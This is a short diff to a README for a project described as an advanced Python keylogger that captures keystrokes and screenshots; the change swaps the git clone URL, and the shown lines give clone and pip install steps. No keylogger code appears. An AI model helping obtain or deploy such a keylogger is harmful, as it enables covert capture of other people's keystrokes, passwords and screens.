@@ -24,6 +24,6 @@ This Python script is an advanced keylogger that captures keystrokes, screenshot
 ## Installation
 Clone the repository and install the required libraries:
 ```bash
-git clone https://github.com/jaysingh/GITHUB/sophisticated-keylogger.git
+git clone https://github.com/Bluejay19/sophisticated-keylogger.git
 cd sophisticated-keylogger
 pip install pynput pycryptodome pillow
